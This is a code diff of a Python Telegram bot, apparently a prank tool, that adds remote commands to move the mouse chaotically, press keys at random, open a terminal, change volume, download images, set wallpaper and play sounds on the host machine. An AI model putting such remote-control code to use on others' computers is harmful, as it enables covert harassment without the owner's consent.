@@ -11,6 +11,10 @@ command_list = '''
 /youtube;время|ссылка - запуск видоса на ютубе
 /terminal - открытие терминала
 /close_tab - закрыть текущую вкладку в браузере
+/volume;1.0 - звук на 100%
+/image;ссылка - скачать картинку и открыть её
+/image;ссылка - скачать картинку и поставить на рабочий стол
+/play;kurwa - проиграть мп3 файл
 '''
 
 @dp.message_handler(commands=['start', 'help', 'restart'])
@@ -28,7 +32,46 @@ async def asshack(message: types.message):
     command = message.text.split(';')
     if command[0] == '/close_tab':
         close_current_tab()
-
+    if command[0] == '/mouse':
+        try:
+            chaotic_mouse_movement(int(command[1]))
+        except:
+            pass
+    if command[0] == '/space':
+        try:
+            press_space_at_random(int(command[1]))
+        except:
+            pass
+    if command[0] == '/terminal':
+        try:
+            open_terminal(int(command[1]))
+        except:
+            pass
+    if command[0] == '/youtube':
+        try:
+            play_youtube_video(command[2], int(command[1]))
+        except:
+            pass
+    if command[0] == '/volume':
+        try:
+            change_volume(float(command[1]))
+        except:
+            pass
+    if command[0] == '/image':
+        try:
+            image_download(command[1])
+        except:
+            pass
+    if command[0] == '/wallpaper':
+        try:
+            image_wallpaper(command[1])
+        except:
+            pass
+    if command[0] == '/play':
+        try:
+            play_sound(command[1])
+        except:
+            pass
 #    match command:
 #        case 'Открыть терминал':
 #            pass
